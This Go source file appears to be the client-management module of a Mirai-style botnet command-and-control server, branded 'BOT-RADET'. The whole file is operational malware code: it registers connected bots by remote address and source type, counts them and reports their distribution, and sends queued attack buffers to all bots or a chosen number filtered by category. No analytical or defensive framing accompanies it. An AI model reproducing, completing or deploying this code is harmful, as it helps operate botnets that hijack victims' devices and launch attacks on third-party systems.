package main
import (
    "time"
    "math/rand"
    "sync"
    "fmt"
)
type AttackSend struct {
    buf         []byte
    count       int
    botCata     string
}
type ClientList struct {
    uid         int
    count       int
    clients     map[int]*Bot
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend
    totalCount  chan int
    cntView     chan int
    distViewReq chan int
    distViewRes chan map[string]int
    listViewReq chan int
    listViewRes chan []*Bot
    cntMutex    *sync.Mutex
}
func NewClientList() *ClientList {
    c := &ClientList{
        0, 0, make(map[int]*Bot), 
        make(chan *Bot, 1024), make(chan *Bot, 1024), 
        make(chan *AttackSend, 1024), make(chan int, 1024), 
        make(chan int, 128), make(chan int, 128), make(chan map[string]int, 128),
        make(chan int, 128), make(chan []*Bot, 128),
        &sync.Mutex{},
    }
    go c.worker()
    go c.fastCountWorker()
    return c
}
func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    select {
    case this.cntView <- 0:
        select {
        case res := <-this.cntView:
            return res
        case <-time.After(1 * time.Second):
            return this.count
        }
    default:
        return this.count
    }
}
func (this *ClientList) Distribution() map[string]int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    select {
    case this.distViewReq <- 0:
        select {
        case res := <-this.distViewRes:
            return res
        case <-time.After(1 * time.Second):
            return make(map[string]int)
        }
    default:
        return make(map[string]int)
    }
}
func (cl *ClientList) AddClient(c *Bot) {
    select {
    case cl.addQueue <- c:
    default:
    }
    addr := c.conn.RemoteAddr().String()
    sourceType := c.source
    const (
        green  = "\x1b[1;32m"
        white  = "\x1b[1;37m"
        yellow = "\x1b[1;33m"
        reset  = "\x1b[0m"
    )
    fmt.Printf(
        "%sCONNECTED %sBOT-RADET:%s%s %sType:%s%s%s\n",
        green,
        white, yellow, addr,
        white, yellow, sourceType, reset,
    )
}
func (this *ClientList) DelClient(c *Bot) {
    select {
    case this.delQueue <- c:
    default:
    }
}
func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    attack := &AttackSend{buf, maxbots, botCata}
    select {
    case this.atkQueue <- attack:
    default:
    }
}
func (this *ClientList) fastCountWorker() {
    for {
        select {
        case delta := <-this.totalCount:
            this.count += delta
            break
        case <-this.cntView:
            select {
            case this.cntView <- this.count:
            default:
            }
            break
        }
    }
}
func (this *ClientList) worker() {
    rand.Seed(time.Now().UTC().UnixNano())
    for {
        select {
        case add := <-this.addQueue:
            this.totalCount <- 1
            this.uid++
            add.uid = this.uid
            this.clients[add.uid] = add
            break
        case del := <-this.delQueue:
            this.totalCount <- -1
            delete(this.clients, del.uid)
            break
        case atk := <-this.atkQueue:
            if atk.count == -1 {
                for _,v := range this.clients {
                    if atk.botCata == "" || atk.botCata == v.source {
                        select {
                        case v.writeChan <- atk.buf:
                        default:
                        }
                    }
                }
            } else {
                var count int
                for _, v := range this.clients {
                    if count >= atk.count {
                        break
                    }
                    if atk.botCata == "" || atk.botCata == v.source {
                        select {
                        case v.writeChan <- atk.buf:
                            count++
                        default:
                        }
                    }
                }
            }
            break
        case <-this.cntView:
            select {
            case this.cntView <- this.count:
            default:
            }
            break
        case <-this.distViewReq:
            res := make(map[string]int)
            for _,v := range this.clients {
                if ok,_ := res[v.source]; ok > 0 {
                    res[v.source]++
                } else {
                    res[v.source] = 1
                }
            }
            this.distViewRes <- res
        case <-this.listViewReq:
            list := make([]*Bot, 0, len(this.clients))
            for _, v := range this.clients {
                list = append(list, v)
            }
            this.listViewRes <- list
        }
    }
}
func (this *ClientList) GetBots() []*Bot {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    select {
    case this.listViewReq <- 0:
        select {
        case res := <-this.listViewRes:
            return res
        case <-time.After(2 * time.Second):
            return make([]*Bot, 0)
        }
    default:
        return make([]*Bot, 0)
    }
}
